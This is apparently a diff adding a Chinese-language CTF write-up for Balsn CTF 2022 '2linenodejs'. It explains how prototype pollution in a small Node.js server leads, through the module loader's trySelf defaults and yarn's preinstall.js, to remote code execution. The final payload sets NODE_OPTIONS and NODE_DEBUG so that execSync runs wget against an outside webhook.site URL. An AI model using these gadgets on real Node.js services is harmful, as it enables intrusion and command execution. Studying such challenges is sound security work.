@@ -1,0 +1,85 @@
+<!-- more -->
+
+## Balsn CTF 2022 - 2linenodejs
+
+程式碼十分簡單：
+
+``` js
+#!/usr/local/bin/node
+process.stdin.setEncoding('utf-8');
+process.stdin.on('readable', () => {
+  try{
+    console.log('HTTP/1.1 200 OK\nContent-Type: text/html\nConnection: Close\n');
+    const json = process.stdin.read().match(/\?(.*?)\ /)?.[1],
+    obj = JSON.parse(json);
+    console.log(`JSON: ${json}, Object:`, require('./index')(obj, {}));
+  }catch (e) {
+    require('./usage')
+  }finally{
+    process.exit();
+  }
+});
+
+// index
+module.exports=(O,o) => (
+    Object.entries(O).forEach(
+        ([K,V])=>Object.entries(V).forEach(
+            ([k,v])=>(o[K]=o[K]||{},o[K][k]=v)
+        )
+    ), o
+);
+```
+
+很明顯有個 prototype pollution 的洞，因此這題考的就是你在 node.js 有了 prototype pollution 以後，要怎麼弄到 RCE。
+
+這邊還有一個關鍵是 catch 裡面的 `require('./usage')`
+
+最後一個關鍵是這篇論文：[Silent Spring: Prototype Pollution Leads to Remote Code Execution in Node.js](https://arxiv.org/abs/2207.11171)，裡面提到很多從原型污染打到 RCE 的案例，然後都有附上 gadget 或是一些提示。
+
+不過論文裡的其中一個洞在這題用的版本已經被修掉了：https://github.com/nodejs/node/blob/v18.8.0/lib/internal/modules/cjs/loader.js#L484
+
+``` js
+const { 1: name, 2: expansion = '' } =
+    RegExpPrototypeExec(EXPORTS_PATTERN, request) || kEmptyObject;
+```
+
+kEmptyObject 是 `ObjectFreeze(ObjectCreate(null))`，所以不會被污染了。
+
+但總之在檔案裡面繼續找一找，就會發現另一個 `trySelf` 的 function 有同個問題，在這裏：https://github.com/nodejs/node/blob/c200106305f4367ba9ad8987af5139979c6cc40c/lib/internal/modules/cjs/loader.js#L454
+
+``` js
+const { data: pkg, path: pkgPath } = readPackageScope(parentPath) || {};
+```
+
+這邊預設值也用了 `{}`，所以可以透過原型污染去干擾這些值。
+
+下面這一段程式碼，會去載入 `./pwn.js` 而不是 `./usage.js`：
+
+``` js
+Object.prototype["data"] = {
+  exports: {
+    ".": "./pwn.js"
+  },
+  name: './usage.js'
+}
+Object.prototype["path"] = './'
+
+require('./usage.js')
+```
+
+因此透過原型污染，可以達成 require 任意文件。接下來的任務就是去找出哪個內建文件有可以使用的 payload，隊友找到 `/opt/yarn-v1.22.19/preinstall.js`，最後長這樣：
+
+```js
+Object.prototype["data"] = {
+  exports: {
+    ".": "./preinstall.js"
+  },
+  name: './usage'
+}
+Object.prototype["path"] = '/opt/yarn-v1.22.19'
+Object.prototype.shell = "node"
+Object.prototype["npm_config_global"] = 1
+Object.prototype.env = {
+  "NODE_DEBUG": "console.log(require('child_process').execSync('wget${IFS}https://webhook.site/a0beafdc-df63-4804-85a8-7945ad473bf5?q=2').toString());process.exit()//",
+  "NODE_OPTIONS": "--require=/proc/self/environ"
+}
